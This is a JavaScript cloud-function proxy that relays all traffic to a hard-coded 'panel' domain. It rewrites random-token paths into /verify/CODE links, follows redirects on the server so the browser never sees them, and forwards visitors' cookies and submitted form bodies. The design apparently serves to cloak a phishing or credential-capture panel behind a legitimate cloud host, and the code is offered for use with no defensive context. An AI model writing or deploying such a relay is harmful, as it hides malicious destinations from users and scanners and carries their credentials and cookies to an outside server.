const crypto = require('crypto');

const PANEL = 'tute.ink';

module.exports = async function (context, req) {
    let path = req.headers['x-ms-original-url'] || req.url || '/';
    try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
    path = path.replace(/^\/api\/proxy/, '');

    // 🚨 SMART ROUTING 🚨
    const parts = path.split('/').filter(Boolean);
    let originalRandomString = '';

    if (parts.length === 2 && parts[0] !== 'l' && parts[0] !== 'verify' && parts[1].length > 4) {
        originalRandomString = parts[0];
        path = `/verify/${parts[1]}`;
    } else if (parts.length === 2 && (parts[0] === 'l' || parts[0] === 'verify') && parts[1].length > 4) {
        // If the browser lands on /l/CODE or /verify/CODE, synthesise a stable random string
        originalRandomString = crypto.createHash('sha1')
            .update(parts[1] + (req.headers['x-forwarded-for'] || ''))
            .digest('hex').slice(0, 12);
        path = `/verify/${parts[1]}`;
    } else if (parts.length === 1 && parts[0].length > 4 && parts[0] !== 'l' && parts[0] !== 'verify') {
        path = `/verify/${parts[0]}`;
    }

    if (!path.startsWith('/')) path = '/' + path;

    if (req.query && Object.keys(req.query).length > 0) {
        const qs = new URLSearchParams(req.query).toString();
        if (!path.includes('?')) path += '?' + qs;
    }

    context.log('Forwarding to:', path);

    const forwardHeaders = {
        'Host': PANEL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': req.headers['accept'] || '*/*',
        'X-Ablegod-Worker': '1'
    };
    if (req.headers['cookie'])       forwardHeaders['Cookie']       = req.headers['cookie'];
    if (req.headers['content-type']) forwardHeaders['Content-Type'] = req.headers['content-type'];

    let body;
    if (!['GET','HEAD'].includes(req.method) && req.body) {
        body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
        if (!forwardHeaders['Content-Type']) forwardHeaders['Content-Type'] = 'application/json';
    }

    try {
        // 🚨 THE MAGIC FIX: SERVER-SIDE REDIRECT FOLLOWING 🚨
        // We follow all redirects on the server. The browser never sees a 302.
        let currentUrl = `https://${PANEL}${path}`;
        let r;
        let finalUrl = currentUrl;

        for (let hop = 0; hop < 5; hop++) {
            r = await fetch(currentUrl, {
                method: req.method,
                headers: forwardHeaders,
                body: body,
                redirect: 'manual'
            });

            const loc = r.headers.get('location');
            if (r.status >= 300 && r.status < 400 && loc) {
                // Resolve the relative redirect (e.g., /verify/CODE -> https://tute.ink/verify/CODE)
                finalUrl = new URL(loc, currentUrl).toString();
                // Rewrite the domain to the panel domain so the next fetch works
                finalUrl = finalUrl.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${PANEL}`);
                context.log(`Redirect hop ${hop} → ${finalUrl}`);
                currentUrl = finalUrl;
                continue;
            }
            break;
        }

        const responseBody = await r.text();
        const contentType  = r.headers.get('content-type') || 'text/html';

        const respHeaders = {
            'Content-Type': contentType,
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, Authorization',
            'Cache-Control': 'no-store, no-cache, must-revalidate'
        };

        // 🚨 CRITICAL FIX: DO NOT send a Location header to the browser. 🚨
        // We swallow the redirect and serve the final 200 HTML content instead.
        
        const setCookie = r.headers.get('set-cookie');
        if (setCookie) respHeaders['Set-Cookie'] = setCookie;

        // Always return 200 to the browser so it stops trying to redirect
        context.res = { status: 200, headers: respHeaders, body: responseBody };
    } catch (e) {
        context.log('Error:', e.message);
        context.res = { status: 500, body: 'Proxy Error: ' + e.message };
    }
};
